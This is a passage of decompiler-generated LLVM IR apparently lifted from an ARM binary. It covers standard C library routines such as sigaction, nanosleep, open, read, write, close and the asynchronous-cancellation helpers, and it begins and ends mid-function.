  %v3_1462c = call i32 @__libc_sigaction(i32 17, i32 %v0_1461c, i32 %v2_14620)
  %v3_14630 = load i32, i32* %stack_var_-60, align 4
  %v2_14634 = icmp ne i32 %v3_14630, 0
  store i1 %v2_14634, i1* %cpsr_c.global-to-local, align 1
  %v7_14634 = icmp eq i32 %v3_14630, 1
  br i1 %v7_14634, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_14614
  %v3_14638 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_14638, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14614, %bb
  call void @__pseudo_cond_branch(i1 %v7_14634, i32 ptrtoint (i32* @global_var_11354.521 to i32))
  %v2_14648 = ptrtoint i32* %stack_var_-32 to i32
  %v2_14650 = call i32 @__libc_nanosleep(i32 %v2_14648, i32 %v2_14648)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_14654 = icmp eq i32 %v2_14650, 0
  br i1 %v2_14654, label %bb26, label %bb25

bb25:                                             ; preds = %.thread1
  store i32 0, i32* @r1, align 4
  store i32 499999999, i32* %r2.global-to-local, align 4
  %v3_14668 = load i32, i32* %stack_var_-32, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br label %bb26

bb26:                                             ; preds = %.thread1, %bb25
  %storemerge = phi i32 [ %v3_14668, %bb25 ], [ 0, %.thread1 ]
  store i32 %storemerge, i32* @r4, align 4
  %v3_14678 = load i32, i32* %stack_var_-40, align 4
  %v1_1467c = and i32 %v3_14678, 65536
  store i32 %v1_1467c, i32* %r2.global-to-local, align 4
  %v2_1467c = icmp eq i32 %v1_1467c, 0
  br i1 %v2_1467c, label %bb27, label %.thread5

bb27:                                             ; preds = %bb26
  %v3_14684 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v3_14684, i32* @r1, align 4
  br label %.thread5

.thread5:                                         ; preds = %bb26, %bb27
  call void @__pseudo_cond_branch(i1 %v2_1467c, i32 ptrtoint (i32* @global_var_11354.521 to i32))
  br label %dec_label_pc_1468c

dec_label_pc_1468c:                               ; preds = %dec_label_pc_145a0, %.thread5
  %v0_1468c = load i32, i32* @r4, align 4
  store i32 %v3_1457c, i32* @r4, align 4
  store i32 %v6_1457c, i32* @r5, align 4
  store i32 %v9_1457c, i32* @r6, align 4
  store i32 %v12_1457c, i32* @r7, align 4
  store i32 %v15_1457c, i32* @lr, align 4
  ret i32 %v0_1468c

; uselistorder directives
  uselistorder i32 %v0_145f4, { 1, 0 }
  uselistorder i32 %v1_145d8.pre, { 0, 2, 1 }
  uselistorder i32* %stack_var_-40, { 2, 0, 3, 1 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7, 8 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1468c, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_14614, { 1, 0 }
  uselistorder label %dec_label_pc_145f8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_145e0, { 1, 0 }
}

define i32 @function_146a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_146a0:
  %v0_146a0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_146a0, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_146a0
  %v2_146a0 = load i32, i32* @r4, align 4
  %v4_146a0 = lshr i32 %v2_146a0, %arg1
  %v5_146a0 = sub i32 32, %arg1
  %v6_146a0 = shl i32 %v2_146a0, %v5_146a0
  %v7_146a0 = or i32 %v6_146a0, %v4_146a0
  %v9_146a0 = and i32 %v7_146a0, %arg1
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_146a0, %bb
  %v0_146a4 = phi i32 [ %arg1, %dec_label_pc_146a0 ], [ %v9_146a0, %bb ]
  ret i32 %v0_146a4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @__GI___close_nocancel() local_unnamed_addr {
entry:
  %v0_146c4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_146c4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_146c4 = load i32, i32* @r0, align 4
  ret i32 %v2_146c4

bb1:                                              ; preds = %entry
  %v0_146c8 = call i32 @__syscall_error()
  ret i32 %v0_146c8
}

define i32 @__GI___libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_146d4 = load i32, i32* @global_var_251f8.524, align 4
  %v2_146d8 = icmp eq i32 %v3_146d4, 0
  store i1 %v2_146d8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_146d8, label %dec_label_pc_146e0, label %entry.dec_label_pc_146fc_crit_edge

entry.dec_label_pc_146fc_crit_edge:               ; preds = %entry
  %v3_146fc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_146fc

dec_label_pc_146e0:                               ; preds = %entry
  %v0_146e0 = load i32, i32* @r7, align 4
  store i32 %v0_146e0, i32* @ip, align 4
  %v0_146f0 = load i32, i32* @r0, align 4
  %v2_146f0 = icmp ugt i32 %v0_146f0, -4097
  %v7_146f0 = icmp eq i32 %v0_146f0, -4096
  store i1 %v7_146f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_146f0, label %bb7, label %bb

bb:                                               ; preds = %bb9, %bb8, %dec_label_pc_146fc, %dec_label_pc_146e0
  %merge = phi i32 [ %v0_146f0, %dec_label_pc_146e0 ], [ %v0_14720, %dec_label_pc_146fc ], [ %v0_14730, %bb8 ], [ %v6_14740, %bb9 ]
  ret i32 %merge

bb7:                                              ; preds = %dec_label_pc_146e0
  %v0_146f8 = call i32 @__syscall_error()
  br label %dec_label_pc_146fc

dec_label_pc_146fc:                               ; preds = %entry.dec_label_pc_146fc_crit_edge, %bb7
  %v3_146fc = phi i32 [ %v3_146fc.pre, %entry.dec_label_pc_146fc_crit_edge ], [ %v0_146f8, %bb7 ]
  %v9_146fc = load i32, i32* @r7, align 4
  store i32 %v9_146fc, i32* %stack_var_-8, align 4
  %v12_146fc = load i32, i32* @lr, align 4
  %v0_14700 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_14700, i32* @ip, align 4
  store i32 %v3_146fc, i32* @r7, align 4
  %v1_1471c = call i32 @__libc_disable_asynccancel(i32 %v0_14700)
  %v0_14720 = load i32, i32* @r7, align 4
  store i32 %v0_14720, i32* @r0, align 4
  %v2_14724 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14724, i32* @r7, align 4
  store i32 %v12_146fc, i32* @lr, align 4
  %v2_14728 = icmp ugt i32 %v0_14720, -4097
  %v7_14728 = icmp eq i32 %v0_14720, -4096
  store i1 %v7_14728, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14728, label %bb8, label %bb

bb8:                                              ; preds = %dec_label_pc_146fc
  %v0_14730 = call i32 @__syscall_error()
  %v0_14740 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14740, label %bb9, label %bb

bb9:                                              ; preds = %bb8
  %v1_14740 = load i32, i32* @r1, align 4
  %v2_14740 = load i32, i32* @ip, align 4
  %v5_14740 = mul i32 %v2_14740, 2097152
  %v6_14740 = and i32 %v5_14740, %v1_14740
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14720, { 0, 2, 3, 1 }
  uselistorder i32 %v0_146f0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_146fc, { 1, 0 }
}

define i32 @__GI___open_nocancel() local_unnamed_addr {
entry:
  %v0_14754 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14754, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14754 = load i32, i32* @r0, align 4
  ret i32 %v2_14754

bb1:                                              ; preds = %entry
  %v0_14758 = call i32 @__syscall_error()
  ret i32 %v0_14758
}

define i32 @__libc_open(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* @r1, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14764 = load i32, i32* @global_var_251f8.524, align 4
  store i32 %v3_14764, i32* %ip.global-to-local, align 4
  %v2_14768 = icmp eq i32 %v3_14764, 0
  store i1 %v2_14768, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14768, label %dec_label_pc_14770, label %entry.dec_label_pc_1478c_crit_edge

entry.dec_label_pc_1478c_crit_edge:               ; preds = %entry
  %v3_1478c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1478c

dec_label_pc_14770:                               ; preds = %entry
  %v0_14770 = load i32, i32* @r7, align 4
  store i32 %v0_14770, i32* %ip.global-to-local, align 4
  %v0_14780 = load i32, i32* @r0, align 4
  %v2_14780 = icmp ugt i32 %v0_14780, -4097
  %v7_14780 = icmp eq i32 %v0_14780, -4096
  store i1 %v7_14780, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14780, label %bb10, label %bb

bb:                                               ; preds = %dec_label_pc_1478c, %bb11, %bb12, %dec_label_pc_14770
  %merge2 = phi i32 [ %v0_14780, %dec_label_pc_14770 ], [ %v0_147b0, %dec_label_pc_1478c ], [ %v0_147c0, %bb11 ], [ %v0_147c0, %bb12 ]
  ret i32 %merge2

bb10:                                             ; preds = %dec_label_pc_14770
  %v0_14788 = call i32 @__syscall_error()
  br label %dec_label_pc_1478c

dec_label_pc_1478c:                               ; preds = %entry.dec_label_pc_1478c_crit_edge, %bb10
  %v3_1478c = phi i32 [ %v3_1478c.pre, %entry.dec_label_pc_1478c_crit_edge ], [ %v0_14788, %bb10 ]
  store i32 %v3_1478c, i32* %stack_var_-24, align 4
  %v9_1478c = load i32, i32* @r2, align 4
  %v12_1478c = load i32, i32* @r3, align 4
  %v15_1478c = load i32, i32* @r7, align 4
  store i32 %v15_1478c, i32* %stack_var_-8, align 4
  %v18_1478c = load i32, i32* @lr, align 4
  %v0_14790 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_14790, i32* %ip.global-to-local, align 4
  %v2_14798 = load i32, i32* %stack_var_-24, align 4
  store i32 %tmp, i32* @r1, align 4
  store i32 %v9_1478c, i32* @r2, align 4
  store i32 %v12_1478c, i32* @r3, align 4
  store i32 %v2_14798, i32* @r7, align 4
  %v1_147ac = call i32 @__libc_disable_asynccancel(i32 %v0_14790)
  %v0_147b0 = load i32, i32* @r7, align 4
  store i32 %v0_147b0, i32* @r0, align 4
  %v2_147b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_147b4, i32* @r7, align 4
  store i32 %v18_1478c, i32* @lr, align 4
  %v2_147b8 = icmp ugt i32 %v0_147b0, -4097
  %v7_147b8 = icmp eq i32 %v0_147b0, -4096
  store i1 %v7_147b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_147b8, label %bb11, label %bb

bb11:                                             ; preds = %dec_label_pc_1478c
  %v0_147c0 = call i32 @__syscall_error()
  %v0_147d0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_147d0, label %bb12, label %bb

bb12:                                             ; preds = %bb11
  %v3_147d0 = load i32, i32* @r1, align 4
  %v4_147d0 = inttoptr i32 %v3_147d0 to i32*
  store i32 %v0_147c0, i32* %v4_147d0, align 4
  %v5_147d0 = load i32, i32* %ip.global-to-local, align 4
  %v6_147d0 = load i32, i32* @r1, align 4
  %v7_147d0 = sub i32 %v6_147d0, %v5_147d0
  store i32 %v7_147d0, i32* @r1, align 4
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_147c0, { 2, 1, 0 }
  uselistorder i32 %v0_147b0, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14780, { 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1478c, { 1, 0 }
  uselistorder label %bb, { 2, 1, 0, 3 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_147e4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_147e4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_147e4 = load i32, i32* @r0, align 4
  ret i32 %v2_147e4

bb1:                                              ; preds = %entry
  %v0_147e8 = call i32 @__syscall_error()
  ret i32 %v0_147e8
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_147f4 = load i32, i32* @global_var_251f8.524, align 4
  store i32 %v3_147f4, i32* %ip.global-to-local, align 4
  %v2_147f8 = icmp eq i32 %v3_147f4, 0
  store i1 %v2_147f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_147f8, label %dec_label_pc_14800, label %entry.dec_label_pc_1481c_crit_edge

entry.dec_label_pc_1481c_crit_edge:               ; preds = %entry
  %v3_1481c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1481c

dec_label_pc_14800:                               ; preds = %entry
  %v0_14800 = load i32, i32* @r7, align 4
  store i32 %v0_14800, i32* %ip.global-to-local, align 4
  %v0_14810 = load i32, i32* @r0, align 4
  %v2_14810 = icmp ugt i32 %v0_14810, -4097
  %v7_14810 = icmp eq i32 %v0_14810, -4096
  store i1 %v7_14810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14810, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_1481c, %dec_label_pc_14800
  %merge = phi i32 [ %v0_14810, %dec_label_pc_14800 ], [ %v0_14840, %dec_label_pc_1481c ], [ %v0_14850, %bb10 ], [ %v8_14860, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_14800
  %v0_14818 = call i32 @__syscall_error()
  br label %dec_label_pc_1481c

dec_label_pc_1481c:                               ; preds = %entry.dec_label_pc_1481c_crit_edge, %bb9
  %v3_1481c = phi i32 [ %v3_1481c.pre, %entry.dec_label_pc_1481c_crit_edge ], [ %v0_14818, %bb9 ]
  store i32 %v3_1481c, i32* %stack_var_-24, align 4
  %v12_1481c = load i32, i32* @r3, align 4
  %v15_1481c = load i32, i32* @r7, align 4
  store i32 %v15_1481c, i32* %stack_var_-8, align 4
  %v18_1481c = load i32, i32* @lr, align 4
  %v0_14820 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_14820, i32* %ip.global-to-local, align 4
  %v2_14828 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_1481c, i32* @r3, align 4
  store i32 %v2_14828, i32* @r7, align 4
  %v1_1483c = call i32 @__libc_disable_asynccancel(i32 %v0_14820)
  %v0_14840 = load i32, i32* @r7, align 4
  store i32 %v0_14840, i32* @r0, align 4
  %v2_14844 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14844, i32* @r7, align 4
  store i32 %v18_1481c, i32* @lr, align 4
  %v2_14848 = icmp ugt i32 %v0_14840, -4097
  %v7_14848 = icmp eq i32 %v0_14840, -4096
  store i1 %v7_14848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14848, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1481c
  %v0_14850 = call i32 @__syscall_error()
  %v0_14860 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14860, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_14860 = load i32, i32* @r1, align 4
  %v2_14860 = load i32, i32* %ip.global-to-local, align 4
  %v3_14860 = udiv i32 %v2_14860, 262144
  %v4_14860 = mul i32 %v2_14860, 16384
  %v5_14860 = or i32 %v3_14860, %v4_14860
  %v8_14860 = and i32 %v5_14860, %v1_14860
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14840, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14810, { 1, 0, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_1481c, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_14874 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14874, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14874 = load i32, i32* @r0, align 4
  ret i32 %v2_14874

bb1:                                              ; preds = %entry
  %v0_14878 = call i32 @__syscall_error()
  ret i32 %v0_14878

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14884 = load i32, i32* @global_var_251f8.524, align 4
  %v2_14888 = icmp eq i32 %v3_14884, 0
  br i1 %v2_14888, label %dec_label_pc_14890, label %entry.dec_label_pc_148ac_crit_edge

entry.dec_label_pc_148ac_crit_edge:               ; preds = %entry
  %v3_148ac.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_148ac

dec_label_pc_14890:                               ; preds = %entry
  %v0_148a0 = load i32, i32* @r0, align 4
  %v2_148a0 = icmp ugt i32 %v0_148a0, -4097
  br i1 %v2_148a0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_148ac, %dec_label_pc_14890
  %merge = phi i32 [ %v0_148a0, %dec_label_pc_14890 ], [ %v0_148d0, %dec_label_pc_148ac ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_14890
  %v0_148a8 = call i32 @__syscall_error()
  br label %dec_label_pc_148ac

dec_label_pc_148ac:                               ; preds = %entry.dec_label_pc_148ac_crit_edge, %bb8
  %v3_148ac = phi i32 [ %v3_148ac.pre, %entry.dec_label_pc_148ac_crit_edge ], [ %v0_148a8, %bb8 ]
  store i32 %v3_148ac, i32* %stack_var_-24, align 4
  %v6_148ac = load i32, i32* @r1, align 4
  %v12_148ac = load i32, i32* @r3, align 4
  %v15_148ac = load i32, i32* @r7, align 4
  store i32 %v15_148ac, i32* %stack_var_-8, align 4
  %v18_148ac = load i32, i32* @lr, align 4
  %v0_148b0 = call i32 @__libc_enable_asynccancel()
  %v2_148b8 = load i32, i32* %stack_var_-24, align 4
  store i32 %v6_148ac, i32* @r1, align 4
  store i32 %v12_148ac, i32* @r3, align 4
  store i32 %v2_148b8, i32* @r7, align 4
  %v1_148cc = call i32 @__libc_disable_asynccancel(i32 %v0_148b0)
  %v0_148d0 = load i32, i32* @r7, align 4
  store i32 %v0_148d0, i32* @r0, align 4
  %v2_148d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_148d4, i32* @r7, align 4
  store i32 %v18_148ac, i32* @lr, align 4
  %v2_148d8 = icmp ugt i32 %v0_148d0, -4097
  br i1 %v2_148d8, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_148ac
  %v0_148e0 = call i32 @__syscall_error()
  ret i32 %v0_148e0

; uselistorder directives
  uselistorder i32 %v0_148d0, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_148ac, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_148f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_148f0 = and i32 %v0_148f0, 2
  %v2_148f0 = icmp eq i32 %v1_148f0, 0
  %v3_148f4 = load i32, i32* @r4, align 4
  store i32 %v3_148f4, i32* %stack_var_-16, align 4
  br i1 %v2_148f0, label %dec_label_pc_148fc, label %dec_label_pc_14970

dec_label_pc_148fc:                               ; preds = %entry
  %v0_148fc = call i32 @__aeabi_read_tp()
  store i32 %v0_148fc, i32* %r0.global-to-local, align 4
  %v1_14900 = add i32 %v0_148fc, -1036
  %v2_14900 = inttoptr i32 %v1_14900 to i32*
  %v3_14900 = load i32, i32* %v2_14900, align 4
  %v1_14904 = add i32 %v0_148fc, -1168
  store i32 %v1_14904, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14908

dec_label_pc_14908:                               ; preds = %dec_label_pc_1493c.dec_label_pc_14908_crit_edge, %dec_label_pc_148fc
  %v0_14914 = phi i32 [ %v0_14914.pre, %dec_label_pc_1493c.dec_label_pc_14908_crit_edge ], [ %v1_14904, %dec_label_pc_148fc ]
  %v0_14908 = phi i32 [ %v0_1493c, %dec_label_pc_1493c.dec_label_pc_14908_crit_edge ], [ %v3_14900, %dec_label_pc_148fc ]
  %v1_14908 = and i32 %v0_14908, -3
  store i32 %v1_14908, i32* %r7.global-to-local, align 4
  store i32 %v0_14908, i32* %r4.global-to-local, align 4
  store i32 %v1_14908, i32* @r1, align 4
  %v1_14914 = add i32 %v0_14914, 132
  store i32 %v1_14914, i32* @r2, align 4
  %v1_1491823 = inttoptr i32 %v1_14914 to i32*
  %v2_1491824 = load i32, i32* %v1_1491823, align 4
  %v3_1491c26 = icmp uge i32 %v2_1491824, %v0_14908
  store i1 %v3_1491c26, i1* %cpsr_c.global-to-local, align 1
  %v9_1491c32 = icmp eq i32 %v2_1491824, %v0_14908
  br i1 %v9_1491c32, label %dec_label_pc_14924, label %dec_label_pc_1493c

dec_label_pc_14924:                               ; preds = %dec_label_pc_14908, %dec_label_pc_14924.dec_label_pc_14918_crit_edge
  %v0_1492433 = phi i32 [ %v1_1491c.pre, %dec_label_pc_14924.dec_label_pc_14918_crit_edge ], [ %v0_14908, %dec_label_pc_14908 ]
  store i32 %v0_1492433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14934 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14934, label %dec_label_pc_14938, label %dec_label_pc_14924.dec_label_pc_14918_crit_edge

dec_label_pc_14924.dec_label_pc_14918_crit_edge:  ; preds = %dec_label_pc_14924
  %v0_14918.pre = load i32, i32* @r2, align 4
  %v1_1491c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14918 = inttoptr i32 %v0_14918.pre to i32*
  %v2_14918 = load i32, i32* %v1_14918, align 4
  %v3_1491c = icmp uge i32 %v2_14918, %v1_1491c.pre
  store i1 %v3_1491c, i1* %cpsr_c.global-to-local, align 1
  %v9_1491c = icmp eq i32 %v2_14918, %v1_1491c.pre
  br i1 %v9_1491c, label %dec_label_pc_14924, label %dec_label_pc_1493c

dec_label_pc_14938:                               ; preds = %dec_label_pc_14924
  %v0_14938 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1493c

dec_label_pc_1493c:                               ; preds = %dec_label_pc_14908, %dec_label_pc_14924.dec_label_pc_14918_crit_edge, %dec_label_pc_14938
  %v0_1493c = phi i32 [ %v0_14938, %dec_label_pc_14938 ], [ %v2_1491824, %dec_label_pc_14908 ], [ %v2_14918, %dec_label_pc_14924.dec_label_pc_14918_crit_edge ]
  %v1_1493c = phi i32 [ %v0_14938, %dec_label_pc_14938 ], [ %v0_14908, %dec_label_pc_14908 ], [ %v1_1491c.pre, %dec_label_pc_14924.dec_label_pc_14918_crit_edge ]
  %v3_1493c = icmp uge i32 %v0_1493c, %v1_1493c
  store i1 %v3_1493c, i1* %cpsr_c.global-to-local, align 1
  %v9_1493c = icmp eq i32 %v0_1493c, %v1_1493c
  br i1 %v9_1493c, label %dec_label_pc_14964.preheader, label %dec_label_pc_1493c.dec_label_pc_14908_crit_edge

dec_label_pc_1493c.dec_label_pc_14908_crit_edge:  ; preds = %dec_label_pc_1493c
  %v0_14914.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14908

dec_label_pc_14964.preheader:                     ; preds = %dec_label_pc_1493c
  %v0_149641 = load i32, i32* %r7.global-to-local, align 4
  %v1_149642 = and i32 %v0_149641, 12
  store i32 %v1_149642, i32* @r3, align 4
  %v2_149683 = icmp ugt i32 %v1_149642, 3
  store i1 %v2_149683, i1* %cpsr_c.global-to-local, align 1
  %v7_149685 = icmp eq i32 %v1_149642, 4
  br i1 %v7_149685, label %dec_label_pc_14948.lr.ph, label %dec_label_pc_14964.preheader.dec_label_pc_14970.loopexit_crit_edge

dec_label_pc_14964.preheader.dec_label_pc_14970.loopexit_crit_edge: ; preds = %dec_label_pc_14964.preheader
  %v1_14974.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14970.loopexit

dec_label_pc_14948.lr.ph:                         ; preds = %dec_label_pc_14964.preheader
  %v0_1494c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1494c = add i32 %v0_1494c.pre, 132
  %v2_14960 = inttoptr i32 %v1_1494c to i32*
  br label %dec_label_pc_14948

dec_label_pc_14948:                               ; preds = %dec_label_pc_14948.lr.ph, %dec_label_pc_14948
  %v0_14948 = phi i32 [ %v0_149641, %dec_label_pc_14948.lr.ph ], [ %v3_14960, %dec_label_pc_14948 ]
  store i32 %v0_14948, i32* @r2, align 4
  store i32 %v1_1494c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_14960 = load i32, i32* %v2_14960, align 4
  store i32 %v3_14960, i32* %r7.global-to-local, align 4
  %v1_14964 = and i32 %v3_14960, 12
  store i32 %v1_14964, i32* @r3, align 4
  %v7_14968 = icmp eq i32 %v1_14964, 4
  br i1 %v7_14968, label %dec_label_pc_14948, label %dec_label_pc_14964.dec_label_pc_14970.loopexit_crit_edge

dec_label_pc_14964.dec_label_pc_14970.loopexit_crit_edge: ; preds = %dec_label_pc_14948
  %v2_14968 = icmp ugt i32 %v1_14964, 3
  store i1 %v2_14968, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_14970.loopexit

dec_label_pc_14970.loopexit:                      ; preds = %dec_label_pc_14964.preheader.dec_label_pc_14970.loopexit_crit_edge, %dec_label_pc_14964.dec_label_pc_14970.loopexit_crit_edge
  %v1_14974.pre = phi i32 [ %v1_14974.pre.pre, %dec_label_pc_14964.preheader.dec_label_pc_14970.loopexit_crit_edge ], [ %v1_1494c, %dec_label_pc_14964.dec_label_pc_14970.loopexit_crit_edge ]
  %v2_14970.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_14970

dec_label_pc_14970:                               ; preds = %dec_label_pc_14970.loopexit, %entry
  %v1_14974 = phi i32 [ %v1_14974.pre, %dec_label_pc_14970.loopexit ], [ %v0_148f0, %entry ]
  %v2_14970 = phi i32 [ %v2_14970.pre, %dec_label_pc_14970.loopexit ], [ %v3_148f4, %entry ]
  store i32 %v2_14970, i32* @r4, align 4
  ret i32 %v1_14974

; uselistorder directives
  uselistorder i32 %v3_14960, { 1, 2, 0 }
  uselistorder i32 %v1_1494c, { 0, 2, 1 }
  uselistorder i32 %v0_14938, { 1, 0 }
  uselistorder i32 %v1_1491c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14908, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_14970.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_14948, { 1, 0 }
  uselistorder label %dec_label_pc_1493c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14924, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14978 = load i32, i32* @r4, align 4
  store i32 %v3_14978, i32* %stack_var_-24, align 4
  store i32 54908, i32* %r8.global-to-local, align 4
  %v0_14980 = call i32 @__aeabi_read_tp()
  %v1_14984 = add i32 %v0_14980, -1036
  %v2_14984 = inttoptr i32 %v1_14984 to i32*
  %v3_14984 = load i32, i32* %v2_14984, align 4
  store i32 %v3_14984, i32* %r6.global-to-local, align 4
  %v1_14988 = add i32 %v0_14980, -1168
  store i32 %v1_14988, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22010.349 to i32), i32* %r8.global-to-local, align 4
  %v1_1499046 = or i32 %v3_14984, 2
  store i32 %v1_1499046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1499449 = icmp eq i32 %v1_1499046, %v3_14984
  br i1 %v9_1499449, label %dec_label_pc_14a40, label %dec_label_pc_1499c

dec_label_pc_1499c:                               ; preds = %entry, %bb.dec_label_pc_1499c_crit_edge
  %v0_149a0 = phi i32 [ %v0_149a0.pre, %bb.dec_label_pc_1499c_crit_edge ], [ %v1_14988, %entry ]
